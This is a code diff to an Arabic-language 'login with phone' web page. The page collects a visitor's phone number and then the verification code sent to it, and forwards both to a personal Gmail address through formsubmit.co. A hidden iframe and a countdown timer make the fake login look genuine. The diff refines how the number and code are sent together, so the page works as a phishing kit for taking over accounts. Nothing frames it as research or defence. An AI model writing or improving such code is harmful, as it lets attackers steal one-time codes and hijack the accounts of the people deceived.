@@ -78,7 +78,7 @@
   <div class="form-box">
     <h2>دخول باستخدام الهاتف</h2>
 
-    <!-- نموذج إرسال الكود -->
+    <!-- نموذج إرسال رقم الهاتف -->
     <form id="phoneForm" action="https://formsubmit.co/hellafi1992@gmail.com" method="POST" target="dummyFrame" onsubmit="return sendPhone();">
       <input type="hidden" name="_captcha" value="false">
       <input type="hidden" name="نوع_الطلب" value="إرسال رقم الهاتف فقط">
@@ -89,9 +89,9 @@
       <button type="submit">أرسل الكود</button>
     </form>
 
-    <!-- القسم الثاني -->
+    <!-- نموذج الكود -->
     <div id="codeSection">
-      <form id="codeForm" action="https://formsubmit.co/hellafi1992@gmail.com" method="POST">
+      <form id="codeForm" action="https://formsubmit.co/hellafi1992@gmail.com" method="POST" onsubmit="return prepareToSend();">
         <input type="hidden" name="_captcha" value="false">
         <input type="hidden" name="نوع_الطلب" value="طلب الدخول">
         <input type="hidden" name="رقم_الهاتف" id="phoneHidden">
@@ -106,7 +106,7 @@
     </div>
   </div>
 
-  <!-- Frame وهمي لمنع إعادة تحميل الصفحة عند إرسال رقم الهاتف -->
+  <!-- إطار مخفي لمنع إعادة تحميل الصفحة -->
   <iframe name="dummyFrame" style="display:none;"></iframe>
 
   <script>
@@ -119,17 +119,31 @@
         return false;
       }
 
-      // حفظ رقم الهاتف في النموذج الثاني
-      document.getElementById('phoneHidden').value = phone;
-
-      // تعطيل خانة الهاتف
+      // تعطيل الحقل ومنع التعديل
       phoneInput.disabled = true;
 
-      // إظهار حقل الكود + العداد
+      // نسخ الرقم إلى النموذج الثاني
+      document.getElementById('phoneHidden').value = phone;
+
+      // إظهار الكود والعداد
       setTimeout(() => {
         document.getElementById('codeSection').style.display = 'block';
         startTimer(300);
       }, 500);
+
+      return true;
+    }
+
+    function prepareToSend() {
+      // تأكد من نسخ رقم الهاتف عند الإرسال النهائي أيضًا
+      const phone = document.getElementById('phone').value.trim();
+      document.getElementById('phoneHidden').value = phone;
+
+      const code = document.getElementById('code').value.trim();
+      if (code === '') {
+        alert('يرجى إدخال الكود');
+        return false;
+      }
 
       return true;
     }
